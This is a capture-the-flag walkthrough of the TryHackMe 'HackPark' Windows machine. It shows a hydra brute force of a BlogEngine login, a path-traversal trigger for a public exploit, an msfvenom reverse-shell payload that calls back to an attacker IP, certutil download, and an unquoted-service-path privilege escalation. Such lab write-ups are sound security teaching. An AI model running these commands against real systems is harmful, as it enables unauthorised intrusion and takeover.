![image](https://user-images.githubusercontent.com/87468669/208858721-852ee5c2-b27e-4d83-a29c-a0c56513edfa.png)

First we start with nmap scan

`nmap -sC -sV -T4 -oN nmap.txt <IP`

```
# Nmap 7.93 scan initiated Tue Dec 20 17:26:57 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 10.10.213.54
Nmap scan report for 10.10.213.54
Host is up (0.16s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-12-20T16:28:45+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2022-12-20T16:28:42+00:00
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2022-12-19T16:25:26
|_Not valid after:  2023-06-20T16:25:26
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 20 17:28:46 2022 -- 1 IP address (1 host up) scanned in 108.50 seconds
```

Nice we got port 80 http and port 3389. Enumerating port 80 first. Checking the IP on browser.

![image](https://user-images.githubusercontent.com/87468669/208859381-9cac2b09-83ab-4ad8-ac6f-ec8ff17f0dd8.png)
 
we got the default home page, just a greeting from the clown penny wise... check the source page.

![image](https://user-images.githubusercontent.com/87468669/208860000-2a54e0ec-54ea-4080-94d9-48f4f2d73576.png)

Checking the source page we can see it is running a blogengine 3.3.6.0 cms... Bursting hidden directories next

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/HackPark]                                                                                                       [10/11]
└─$ ffuf -u "http://10.10.155.116/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 403,500 -e .txt,.php,.zip,.bak                                                    
                                                                                                                                                                      
        /'___\  /'___\           /'___\                                                                                                                               
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                               
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                              
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                              
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                               
          \/_/    \/_/   \/___/    \/_/                                                                                                                               
                                                                                                                                                                      
       v1.5.0 Kali Exclusive <3                                                                                                                                       
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.155.116/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .zip .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,500
________________________________________________

                        [Status: 200, Size: 8997, Words: 1588, Lines: 157, Duration: 233ms]
account                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 210ms]
ADMIN                   [Status: 302, Size: 173, Words: 6, Lines: 4, Duration: 2584ms]
Admin                   [Status: 302, Size: 173, Words: 6, Lines: 4, Duration: 2649ms]
admin                   [Status: 302, Size: 173, Words: 6, Lines: 4, Duration: 2722ms]
archive                 [Status: 200, Size: 8325, Words: 1413, Lines: 148, Duration: 258ms]
Archive                 [Status: 200, Size: 8325, Words: 1413, Lines: 148, Duration: 214ms]
archives                [Status: 200, Size: 8326, Words: 1413, Lines: 148, Duration: 233ms]
aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 215ms]
contacto                [Status: 200, Size: 9936, Words: 1725, Lines: 166, Duration: 3037ms]
contact                 [Status: 200, Size: 9935, Words: 1725, Lines: 166, Duration: 3232ms]
:: Progress: [23070/23070] :: Job [1/1] :: 182 req/sec :: Duration: [0:03:11] :: Errors: 0 ::

```

checking the /admin directory first.

![image](https://user-images.githubusercontent.com/87468669/208860971-09695e3a-eefa-458e-b304-7db188f0c578.png)

we have a login page. Try to bypass the login page but failed... Let's bruteforce the login page use hydra. First we need to capture the requests using burp suite.

![image](https://user-images.githubusercontent.com/87468669/208863944-399f9108-af59-48b0-9b12-c82ff6d89d65.png)

now lt's brutforce th login page using hydra

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/HackPark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.68  http-form-post "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=kpQeWMvbPipRcrvzvHzgn0zvV0PCRYZfH%2FvUKCZRsHUGShZHUBvtv%2F67hkZWfKeTAIXMXE968sCuuYkcxW7upR38Ros14NgZ3GxFxsecyKgx1A5yBARHNfLBxzSkEirZyG3Oq0xdYwh6JP1JOlFqe9ye7phAM%2BDSvO7fqrvN%2Fi4WY2F4&__EVENTVALIDATION=6Tz6HQrM1xgvnC8anXV0XBcOO%2FFML%2FFqI5CVMj1%2Fniy3UhMdefOO7hCxerPk%2BkyBY5gpyIxN%2Fv6Rsy8ae2DaIQ7s73YjR1q194SejKVYNPmCcIgmxa8H0%2BYyem5BFEDuLRAxt9kkZUjBFPppYHvtSyZwz0bREYvSd%2FVop3%2FY8uEp7sgH&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

```

![image](https://user-images.githubusercontent.com/87468669/208906625-99eed488-7a12-4714-8b1b-5a7ab5fe583f.png)

now let's login

![image](https://user-images.githubusercontent.com/87468669/208907883-08ba3fd0-a830-440c-8eac-7f43c886dd55.png)

as remembered, the web app is running blogengine 3.3.6, let's search for public exploit. using searchsploit 

![image](https://user-images.githubusercontent.com/87468669/208908350-8ad5c3b2-02fd-45d8-8ad0-c80d6cd619d2.png)

edit the exploit, and follow the instruction in the exploit.

![image](https://user-images.githubusercontent.com/87468669/208908843-f9298759-089e-4f06-abff-b0e2c8607803.png)

Now let's upload the exploit, according to th instruction in the exploit.

![image](https://user-images.githubusercontent.com/87468669/208909278-f7241a4a-d9eb-43aa-a00c-34eed9423dce.png)

ncat listener ready 

![image](https://user-images.githubusercontent.com/87468669/208909613-7cd7b263-0923-4b44-814a-a4e53c7c83c4.png)

let's call the shell through this path `/?theme=../../App_Data/files`

![image](https://user-images.githubusercontent.com/87468669/208910022-e5482c42-6986-4ba9-bb60-a19abc4ad644.png)

Check back on ncat listener and boom got shell...

![image](https://user-images.githubusercontent.com/87468669/208910158-dee9b398-db23-482c-9e0e-7055246486c2.png)

let's get a more stable shell... First using msfvenom to create a revshell payload 

```
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.49.111 LPORT=1337 -f exe -o Park.exe
```

After that using certutil.exe to download the payload into the target machine.

![image](https://user-images.githubusercontent.com/87468669/208912969-ddbffd05-6f7f-437b-aad7-e62765c1c7e2.png)

fire up ncat listener and execute the payload in the target machine.

![image](https://user-images.githubusercontent.com/87468669/208913214-a94668d4-7566-4413-b349-82cd90d856f2.png)

now we have a better shell, let's escalte privs by running winpeas.exe

![image](https://user-images.githubusercontent.com/87468669/208914343-ae0b136c-2f0c-47fb-ad5f-a10c50a45c3f.png)

we have an unquoted service path, let's check the directory for abnormal service running

![image](https://user-images.githubusercontent.com/87468669/208914702-ca266a07-723e-474b-9975-2630d4e1b5a4.png)

let's abuse the binary, by creating a payload using msfvenom and replacing the message.exe with the payload 

